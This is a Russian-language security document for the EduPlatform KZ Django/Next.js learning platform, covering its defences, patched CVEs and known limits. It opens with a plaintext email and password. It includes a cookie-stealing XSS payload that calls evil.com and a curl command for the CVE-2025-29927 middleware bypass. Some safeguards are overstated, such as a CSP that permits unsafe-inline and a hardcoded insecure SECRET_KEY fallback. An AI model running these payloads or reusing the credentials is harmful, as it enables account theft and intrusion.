Email: 12@gmail.com
Password: Admin1234!

# Документация по безопасности — EduPlatform KZ

## Стек технологий

| Уровень | Технология |
|---------|-----------|
| Frontend | Next.js 16.1.6 + React 19 + TypeScript |
| Backend | Django 5.0 + Django REST Framework 3.14 |
| Аутентификация | JWT (djangorestframework-simplejwt 5.4.0) |
| База данных | SQLite (dev) / PostgreSQL (prod) |

---

# ЧАСТЬ 1 — Реализованные меры безопасности

## 1.1 Аутентификация (JWT)

### Архитектура токенов

```
[Клиент]                          [Сервер Django]
   |                                     |
   |── POST /login { email, pass } ──►  |
   |                                     |── Проверяет email + пароль
   |                                     |── Проверяет is_active
   |◄── { access_token, refresh_token } ─|
   |                                     |
   |── Хранит в localStorage             |
   |── Устанавливает auth_status cookie  |
   |                                     |
   |── GET /api/courses/ ─────────────► |
   |   Authorization: Bearer <access>    |── Верифицирует JWT подпись
   |                                     |── Проверяет срок действия
   |                                     |── Проверяет is_active (каждый запрос)
   |◄── { данные } ─────────────────────|
```

### Настройки JWT (config/settings.py)

```python
SIMPLE_JWT = {
    'ACCESS_TOKEN_LIFETIME':  timedelta(minutes=60),  # Короткий срок — уменьшает окно атаки
    'REFRESH_TOKEN_LIFETIME': timedelta(days=7),       # 7 дней для комфорта
    'ROTATE_REFRESH_TOKENS':  True,   # Каждое использование = новый refresh token
    'BLACKLIST_AFTER_ROTATION': True, # Старый refresh → в чёрный список
    'ALGORITHM': 'HS256',             # Один строгий алгоритм (защита от Algorithm Confusion)
    'USER_AUTHENTICATION_RULE': '...default_user_authentication_rule',  # CVE-2024-22513
}
```

**Почему это важно:**
- **Короткий access token (60 мин)** — украденный токен перестаёт работать максимум через 60 минут
- **Ротация refresh токенов** — при каждом обновлении старый токен становится недействительным. Если токен украли — сервер заметит попытку повторного использования
- **Blacklist** — logout немедленно инвалидирует токен, не дожидаясь истечения срока
- **HS256 без альтернатив** — исключает Algorithm Confusion атаки (RS256→HS256 downgrade, "none" algorithm bypass)

### Проверка истечения токена на клиенте (src/lib/tokenSecurity.ts)

```typescript
// Декодирует JWT payload (без проверки подписи — она на сервере)
export function decodeJWTPayload(token: string): JWTPayload | null

// Проверяет не истёк ли токен (с буфером 30 сек)
export function isTokenValid(token: string | null): boolean

// True если до истечения осталось < 5 минут (превентивное обновление)
export function shouldRefreshToken(token: string): boolean
```

**Поток проверки в AuthContext.tsx:**
```typescript
useEffect(() => {
  const token = getAccessToken();
  if (savedUser && token && !isTokenValid(token)) {
    void logoutUser();  // Принудительный выход без ожидания 401 от сервера
    setUser(null);
  }
}, []);
```

### Auth Cookies для серверного middleware

Токены (JWT) хранятся в `localStorage` для API-запросов. Для серверного `middleware.ts`
используются отдельные cookies — только флаги состояния, без JWT:

```typescript
// src/lib/tokenSecurity.ts
export function setAuthCookie(role: string): void {
  document.cookie = `auth_status=1; path=/; SameSite=Strict; max-age=604800`;
  document.cookie = `user_role=${role}; path=/; SameSite=Strict; max-age=604800`;
}
```

- `SameSite=Strict` — браузер не отправляет cookies при cross-site запросах (CSRF защита)
- Cookies содержат только флаг `1` и роль — никакого JWT, никаких секретов

---

## 1.2 Защита маршрутов (src/middleware.ts)

Next.js middleware выполняется на сервере при каждом запросе, до рендеринга страницы.

### Схема защиты

```
Запрос на /ru/teacher/courses
        │
        ▼
[CVE-2025-29927 блок] ── x-middleware-subrequest? → 400 Bad Request
        │
        ▼
[Читает cookies] ── auth_status=1? user_role=teacher?
        │
        ├─ Нет auth_status → редирект на /ru/login?next=/ru/teacher/courses
        │
        ├─ Есть auth_status, но role != teacher → редирект на /ru/
        │
        └─ Всё ок → пропускает запрос дальше
```

### Защищённые маршруты

```typescript
const PROTECTED_PATHS = ['/profile', '/settings', '/learn', '/certificates', '/teacher'];
const GUEST_ONLY_PATHS = ['/login', '/register'];  // Авторизованным недоступны
```

### Defense-in-Depth против CVE-2025-29927

```typescript
// Блокируем заголовок, который мог обойти весь middleware
if (request.headers.get('x-middleware-subrequest')) {
  return new NextResponse(null, { status: 400 });
}
```

---

## 1.3 Защита от брутфорса (двухуровневая)

### Уровень 1 — Клиентский rate limiter (src/lib/rateLimiter.ts)

```
5 неудачных попыток за 15 минут → блокировка UI на 15 минут
```

```typescript
// Параметры
const MAX_ATTEMPTS = 5;
const WINDOW_MS = 15 * 60 * 1000;       // скользящее окно 15 минут
const BLOCK_DURATION_MS = 15 * 60 * 1000; // блокировка 15 минут

// Использование на странице login
if (isRateLimited(email)) {
  // Показываем таймер: "Попробуйте через 14:32"
  return;
}
recordFailedAttempt(email);
clearAttempts(email);  // при успехе — сбрасываем счётчик
```

**Функции:**
- `isRateLimited(identifier)` — заблокирован ли пользователь
- `recordFailedAttempt(identifier)` — записать неудачную попытку
- `clearAttempts(identifier)` — сброс при успешном входе
- `getBlockedSecondsRemaining(identifier)` — сколько секунд осталось
- `formatBlockedTime(identifier)` — форматирует "мм:сс" для отображения

### Уровень 2 — Серверный rate limiter (users/throttles.py)

Это **основная защита** — не обходится даже при прямых curl запросах к API:

```python
class LoginRateThrottle(AnonRateThrottle):
    scope = 'login'
    rate = '5/min'          # 5 попыток в минуту на IP

class SendCodeRateThrottle(AnonRateThrottle):
    scope = 'send_code'
    rate = '3/hour'         # 3 кода/час (SMTP дорогой)

class RegisterRateThrottle(AnonRateThrottle):
    scope = 'register'
    rate = '10/hour'        # 10 регистраций/час

class VerifyCodeRateThrottle(AnonRateThrottle):
    scope = 'verify_code'
    rate = '20/hour'        # 20 проверок кода/час
```

**Глобальные лимиты (для всех остальных endpoints):**
```python
'DEFAULT_THROTTLE_RATES': {
    'anon': '100/day',    # Анонимные: 100 запросов/день
    'user': '1000/day',   # Авторизованные: 1000 запросов/день
}
```

---

## 1.4 Защита от XSS (src/lib/sanitize.ts)

### Функции санитизации

```typescript
// Экранирует HTML-спецсимволы: <script> → &lt;script&gt;
escapeHtml(input: string): string

// Убирает управляющие символы, обрезает до maxLength (защита от DoS)
sanitizeText(input: string, maxLength = 1000): string

// Email: toLowerCase + trim + ограничение 254 символа (RFC 5321)
sanitizeEmail(email: string): string

// Валидация email по RFC 5322
isValidEmail(email: string): boolean

// Имя: буквы Unicode (кириллица, латиница), пробелы, дефисы
isValidName(name: string): boolean

// Поисковый запрос: убирает <>"'\
sanitizeSearchQuery(query: string): string

// Проверяет URL — только http/https (блокирует javascript: и data:)
isSafeUrl(url: string): boolean

// Применяет sanitizeText ко всем string полям объекта
sanitizeFormData<T>(data: T): T
```

### Почему javascript: и data: опасны

```html
<!-- XSS через href -->
<a href="javascript:fetch('https://evil.com/?c='+document.cookie)">Нажми</a>

<!-- XSS через src -->
<img src="data:text/html,<script>alert(1)</script>">
```

Функция `isSafeUrl()` блокирует оба вектора, проверяя протокол через `new URL()`.

---

## 1.5 Надёжность пароля (src/lib/passwordStrength.ts)

Реализован по стандарту **NIST SP 800-63B**.

### 5 критериев проверки

```typescript
interface PasswordChecks {
  length:    boolean;  // >= 8 символов
  uppercase: boolean;  // A-Z
  lowercase: boolean;  // a-z
  numbers:   boolean;  // 0-9
  special:   boolean;  // !@#$%^&*...
}
```

### Уровни надёжности

| Балл | Уровень | Цвет | Требования |
|------|---------|------|-----------|
| 0 | Очень слабый | Красный | 1 критерий |
| 1 | Слабый | Оранжевый | 2 критерия |
| 2 | Средний | Жёлтый | 3 критерия |
| 3 | Сильный | Зелёный | 4 критерия |
| 4 | Очень сильный | Тёмно-зелёный | 5 критериев |

```typescript
// Минимум для регистрации (score >= 2):
isPasswordAcceptable(password): boolean

// Строгая проверка: длина + верхний + нижний + (цифра или спецсимвол)
meetsMinimumRequirements(password): boolean
```

---

## 1.6 HTTP Security Headers (next.config.ts)

Применяются ко всем маршрутам Next.js приложения:

### Content-Security-Policy (CSP)

```
default-src 'self'
script-src 'self' 'unsafe-eval' 'unsafe-inline'
style-src 'self' 'unsafe-inline'
img-src 'self' data: blob: http://localhost:8000 https:
font-src 'self' data:
connect-src 'self' http://localhost:8000
frame-src https://www.youtube.com https://youtube-nocookie.com
frame-ancestors 'none'
form-action 'self'
base-uri 'self'
object-src 'none'
```

**Ключевые директивы:**
- `default-src 'self'` — ресурсы только с собственного домена
- `object-src 'none'` — запрещает Flash и устаревшие плагины
- `frame-ancestors 'none'` — запрещает встраивание в iframe (Clickjacking)
- `base-uri 'self'` — защита от Base tag hijacking

### Остальные заголовки

| Заголовок | Значение | Атака которую блокирует |
|-----------|----------|------------------------|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` | SSL stripping, MITM |
| `X-Frame-Options` | `DENY` | Clickjacking |
| `X-Content-Type-Options` | `nosniff` | MIME-sniffing XSS |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Утечка URL в Referer |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), payment=()` | Злоупотребление браузерными API |
| `X-DNS-Prefetch-Control` | `on` | DNS prefetch контроль |

---

## 1.7 CORS (config/settings.py)

```python
CORS_ALLOWED_ORIGINS = [
    "http://localhost:3000",
    "http://127.0.0.1:3000",
]
CORS_ALLOW_CREDENTIALS = True
CORS_ALLOW_HEADERS = ['accept', 'authorization', 'content-type', 'x-csrftoken', ...]
```

Разрешены только явно перечисленные origins. Wildcard `*` не используется.
В production необходимо заменить `localhost` на реальный домен.

---

## 1.8 Верификация Email

Двухэтапная регистрация: сначала подтверждение email, потом создание аккаунта.

```
[Пользователь вводит email]
        │
        ▼
POST /api/users/send-code/   ← Rate limit: 3/час
        │── Генерирует 6-значный код
        │── Сохраняет в БД с TTL 10 минут
        │── Отправляет на email
        ▼
[Пользователь вводит код]
        │
        ▼
POST /api/users/verify-code/  ← Rate limit: 20/час
        │── Проверяет код и время жизни
        │── Устанавливает is_verified = True
        ▼
[Только теперь доступна регистрация]
```

**Защитные свойства:**
- Код действителен **10 минут**
- При запросе нового кода — старые удаляются
- Rate limit 3/час — предотвращает спам на чужой email
- Rate limit 20/час — защита от брутфорса кода (10^6 = 1 млн комбинаций, 20 попыток/час → невозможно перебрать)

---

## 1.9 Авторизация объектов (защита от IDOR/BOLA)

Каждый teacher-endpoint проверяет что объект принадлежит текущему пользователю:

```python
# Курс — фильтр на уровне БД
course = Course.objects.get(pk=pk, teacher=request.user)  # 404 если не owner

# Модуль — проверка через связь
if module.course.teacher != request.user:
    return Response({'detail': 'Нет доступа'}, status=403)

# Урок — цепочка проверок
if lesson.module.course.teacher != request.user:
    return Response({'detail': 'Нет доступа'}, status=403)

# Материал — глубокая проверка
if material.lesson.module.course.teacher != request.user:
    return Response({'detail': 'Нет доступа'}, status=403)
```

**Без этого** преподаватель A мог бы изменить или удалить курсы преподавателя B,
зная только числовой ID объекта (IDOR — Insecure Direct Object Reference).

---

## 1.10 Аудит-логирование (users/views.py)

```python
logger = logging.getLogger('users.auth')

# Успешный вход
logger.info('Login success: email=%s ip=%s', user.email, ip)

# Неудачная попытка
logger.warning('Login failed: email=%s ip=%s', email, ip)

# Регистрация
logger.info('User registered: email=%s role=%s ip=%s', ...)

# Выход
logger.info('Logout: user=%s', user.email)

# Удаление аккаунта
logger.info('DeleteAccount: user=%s', email)
```

**Получение реального IP** (с поддержкой reverse proxy):
```python
def _get_client_ip(request) -> str:
    x_forwarded = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded:
        return x_forwarded.split(',')[0].strip()
    return request.META.get('REMOTE_ADDR', 'unknown')
```

---

## 1.11 Production Security Settings (config/settings.py)

Автоматически включаются при `DEBUG=False`:

```python
if not DEBUG:
    SECURE_SSL_REDIRECT = True           # Принудительный редирект HTTP → HTTPS
    SESSION_COOKIE_SECURE = True         # Session cookie только по HTTPS
    CSRF_COOKIE_SECURE = True            # CSRF cookie только по HTTPS
    SECURE_HSTS_SECONDS = 31536000       # HSTS 1 год
    SECURE_HSTS_INCLUDE_SUBDOMAINS = True
    SECURE_HSTS_PRELOAD = True           # Внесение в браузерный preload list
    SECURE_CONTENT_TYPE_NOSNIFF = True   # X-Content-Type-Options: nosniff
    SECURE_BROWSER_XSS_FILTER = True     # X-XSS-Protection: 1; mode=block
    X_FRAME_OPTIONS = 'DENY'             # X-Frame-Options: DENY
```

---

## 1.12 Хэширование паролей

Django использует **PBKDF2-SHA256** по умолчанию:
- 870 000 итераций (Django 5.0)
- Случайный salt для каждого пароля
- Невозможно восстановить оригинальный пароль из хэша

**Дополнительная валидация паролей:**
```python
AUTH_PASSWORD_VALIDATORS = [
    'UserAttributeSimilarityValidator',  # Не похож на email/имя
    'MinimumLengthValidator',            # Минимум 8 символов
    'CommonPasswordValidator',           # Не из списка топ-20000 паролей
    'NumericPasswordValidator',          # Не только цифры
]
```

---

## 1.13 Защита секретов

```python
# Секрет никогда не хардкодится — только из .env
SECRET_KEY = os.environ.get('SECRET_KEY', 'django-insecure-...')

# Email credentials
EMAIL_HOST_USER = os.environ.get('EMAIL_HOST_USER', '')
EMAIL_HOST_PASSWORD = os.environ.get('EMAIL_HOST_PASSWORD', '')
```

`.env` файл добавлен в `.gitignore`. В репозитории нет секретов.

---

# ЧАСТЬ 2 — Исправленные уязвимости (патчи)

## 2.1 CVE-2025-29927 — Next.js Middleware Bypass

**Оценка:** Critical

**Суть атаки:**
```bash
# Один заголовок обходил весь middleware.ts
curl -H "x-middleware-subrequest: middleware" https://site.com/ru/teacher/courses
# → 200 OK без токена, без проверки роли
```

**Исправление:**
1. Next.js `16.1.4 → 16.1.6` (патч в фреймворке)
2. Defense-in-depth блок в `middleware.ts`:
```typescript
if (request.headers.get('x-middleware-subrequest')) {
  return new NextResponse(null, { status: 400 });
}
```

---

## 2.2 CVE-2024-22513 — SimpleJWT Account Disabled Bypass

**Оценка:** High

**Суть атаки:**
```
1. Пользователь входит → получает access token (60 мин)
2. Администратор блокирует аккаунт: is_active = False
3. До v5.3.1: пользователь работает ещё 60 минут как ни в чём не бывало
```

**Исправление:**
```
requirements.txt: simplejwt 5.3.1 → 5.4.0
```
```python
# settings.py — проверка is_active при каждом JWT запросе
'USER_AUTHENTICATION_RULE': 'rest_framework_simplejwt.authentication.default_user_authentication_rule'
```

---

## 2.3 DoS уязвимости Next.js (GHSA-9g9p, GHSA-h25m, GHSA-5f7q)

**Оценка:** High

- **GHSA-9g9p** — DoS через Image Optimizer при некорректном `remotePatterns`
- **GHSA-h25m** — DoS через десериализацию HTTP в React Server Components
- **GHSA-5f7q** — Неограниченное потребление памяти через PPR Resume Endpoint

**Исправление:** `npm audit fix --force` → Next.js `16.1.4 → 16.1.6`

---

## 2.4 ReDoS в ajv и minimatch

**Оценка:** Moderate / High

Специально созданные входные данные вызывали катастрофический откат регулярных
выражений → CPU зависал → DoS сервиса.

**Исправление:** `npm audit fix` обновил транзитивные зависимости.

---

## 2.5 Refresh Token не инвалидировался при logout

**Оценка:** High

**Было:**
```typescript
export function logoutUser(): void {
  localStorage.removeItem('refresh_token');  // токен на сервере жив ещё 7 дней!
  clearAuthCookie();
}
```

**Стало:**
```typescript
export async function logoutUser(): Promise<void> {
  // Сначала инвалидируем на сервере
  await fetch(`${API_URL}/users/logout/`, {
    method: 'POST',
    body: JSON.stringify({ refresh: refreshToken }),
  });
  // Потом чистим локально
  localStorage.removeItem('refresh_token');
  clearAuthCookie();
}
```

---

## 2.6 Небезопасный дефолт DEFAULT_PERMISSION_CLASSES

**Оценка:** High

**Было:** Любой новый API endpoint без явного `permission_classes` был публичным.

**Стало:**
```python
'DEFAULT_PERMISSION_CLASSES': ('rest_framework.permissions.IsAuthenticated',)
```

Теперь новый endpoint по умолчанию закрыт. Публичные явно декларируют `AllowAny`.

---

## 2.7 HSTS без preload

**Оценка:** Medium

**Было:** `max-age=31536000; includeSubDomains`

Первый HTTP-запрос пользователя мог быть перехвачен SSL stripping атакой —
браузер ещё не знал что сайт только HTTPS.

**Стало:** `max-age=31536000; includeSubDomains; preload`

Домен вносится в встроенный список браузера — HTTPS принудительно всегда.

---

# ЧАСТЬ 3 — OWASP Top 10 (2021/2025)

| № | Категория | Статус | Реализованная мера |
|---|-----------|--------|-------------------|
| A01 | Broken Access Control | ✅ Закрыто | IDOR-проверки в каждом view, роли в middleware |
| A02 | Cryptographic Failures | ⚠️ Частично | JWT HS256, PBKDF2 пароли; токены в localStorage* |
| A03 | Injection | ✅ Закрыто | Django ORM (parameterized queries), DRF serializers, sanitize.ts |
| A04 | Insecure Design | ✅ Закрыто | Rate limiting, email верификация, разделение ролей |
| A05 | Security Misconfiguration | ✅ Закрыто | IsAuthenticated дефолт, security headers, DEBUG=False в prod |
| A06 | Vulnerable Components | ✅ Закрыто | npm audit fix, simplejwt 5.4.0, Next.js 16.1.6 |
| A07 | Auth Failures | ✅ Закрыто | Throttling, token blacklist, is_active проверка, PBKDF2 |
| A08 | Software/Data Integrity | ✅ Закрыто | npm audit; email верификация при регистрации |
| A09 | Security Logging | ✅ Закрыто | Аудит-лог всех auth событий с IP и email |
| A10 | SSRF | ✅ Закрыто | Next.js 16.1.6+, whitelist в remotePatterns, isSafeUrl() |

*) токены в `localStorage` — см. раздел "Известные ограничения"

---

# ЧАСТЬ 4 — Известные ограничения

## Токены в localStorage (Medium Risk)

**Проблема:** Access и refresh токены хранятся в `localStorage`.
При успешной XSS атаке токены могут быть украдены JavaScript-кодом.

**Текущая митигация:**
- CSP заголовок ограничивает источники скриптов (снижает вероятность XSS)
- Короткое время жизни access token (60 мин)
- Санитизация всего пользовательского ввода (sanitize.ts)

**Правильное решение (HttpOnly cookies):**
```
1. Django login возвращает токены через Set-Cookie: token=...; HttpOnly; Secure; SameSite=Strict
2. Фронтенд НЕ хранит токены в localStorage
3. Браузер автоматически отправляет cookie с каждым запросом
4. JavaScript не может прочитать HttpOnly cookie — XSS кража невозможна
5. DRF читает токен из cookie, а не из Authorization заголовка
```

Требует рефактора и бэкенда, и фронтенда.

---

# ЧАСТЬ 5 — Команды для применения изменений

```bash
# Frontend
cd diplom-front
npm install        # применит обновления Next.js 16.1.6
npm run build      # проверит TypeScript + сборку

# Backend
cd diplom-backend
pip install -r requirements.txt    # обновит simplejwt до 5.4.0
python manage.py migrate           # применит миграции blacklist
python manage.py runserver
```
